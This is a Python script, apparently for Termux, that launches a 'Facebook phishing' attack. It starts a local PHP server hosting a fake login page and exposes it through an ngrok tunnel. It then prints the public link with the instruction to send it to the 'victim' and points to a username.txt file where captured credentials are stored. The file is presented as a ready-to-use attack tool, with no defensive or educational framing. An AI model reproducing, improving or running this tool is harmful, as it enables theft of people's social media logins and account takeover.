#!/bin/python

import os

#coded by SHYLEKH
#donot copy the code

red = "\033[1;31;40m"
green = "\033[1;32;40m"
blue = "\033[1;36;40m"

indro = """
┏━╸┏━┓╺┳┓┏━╸╺┳┓   ┏┓ ╻ ╻   ┏━┓╻ ╻╻ ╻╻  ┏━╸╻┏ ╻ ╻
┃  ┃ ┃ ┃┃┣╸  ┃┃   ┣┻┓┗┳┛   ┗━┓┣━┫┗┳┛┃  ┣╸ ┣┻┓┣━┫
┗━╸┗━┛╺┻┛┗━╸╺┻┛   ┗━┛ ╹    ┗━┛╹ ╹ ╹ ┗━╸┗━╸╹ ╹╹ ╹
"""

banner = """
 ____  _    _   _ _____  __        ___   _    _    _     _____
| __ )| |  | | | | ____| \ \      / / | | |  / \  | |   | ____|
|  _ \| |  | | | |  _|    \ \ /\ / /| |_| | / _ \ | |   |  _|
| |_) | |__| |_| | |___    \ V  V / |  _  |/ ___ \| |___| |___
|____/|_____\___/|_____|    \_/\_/  |_| |_/_/   \_\_____|_____|
===============================================================
                      CODED BY SHYLEKH
===============================================================                 
"""

os.system("clear")
print(green + indro)
os.system("sleep 2")
os.system("clear")

print(blue + banner)
print("")

print(red+"["+green+"1"+red+"]"+green+" ADVANCE FACEBOOK PHISHING")
print("")
print(red+"["+green+"2"+red+"]"+green+" EXIT")
print("")
option = input(red + "Enter your choice: " +green)

if (option=="1"):
	os.system("clear")
	print(red + banner)
	print("")
	port = input(green + "Enter port number: ")
	print("")
	print(red + "Creating php server...")
	php = "php -S localhost:"+port+" -t $HOME/BLUE-WHALE/server > /dev/null 2>&1 &"
	os.system(php)
	os.system("sleep 2")
	print("")
	print(green + "php server created")
	os.system("sleep 2")
	print("")
	print(green + "port forwarding...")
	os.system("chmod +x ngrok")
	start = "./ngrok http "+port+" > /dev/null 2>&1 &"
	os.system(start)
	os.system("sleep 10")
	print("")
	print(red + "Generating link...")
	os.system("sleep 2")
	print("")
	os.system("link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'http://[0-9a-z]*\.ngrok.io'); printf '\e[0m\e[31m[\e[0m*\e[31m]\e[92m SEND THIS LINK TO VICTIM: \e[0m%s\e[0m\n' $link")
	print("")
	print(red+"["+blue+"#"+red+"] "+green+"PLEASE CHECK THE username.txt FILE IN YOUR SDCARD TO GET THE CREDENTIALS")
	print("")
	print(red+"["+blue+"#"+red+"] "+green+"PLEASE CLOSE THE TERMUX TO CLOSE THE CONNECTION")
	print("")
	stop = input(green+"DOYOU WANT TO EXIT:"+red+"[y]/["+blue+"n"+red+"]: ")
	if (stop=="y"):
		print("")
		print(red+"Exiting...")
		os.system("sleep 1")
		os.system("exit")
		print("")
	elif(stop=="n"):
		print("")
		print(red+"PLEASE CLOSE THE TERMUX TO EXIT...")
		print("")
		exit()
	else:
		print("")
		print(red+"INVALID INPUT")
		print("")
		exit()
		
elif(option=="2"):
	print("")
	print(red+"Exiting...")
	os.system("sleep 1")
	os.system("clear")
	print(blue+indro)
	os.system("sleep 2")
	os.system("clear")
	exit()
	
else:
	print("")
	print(red+"INVALID INPUT")
	print("")
	exit()
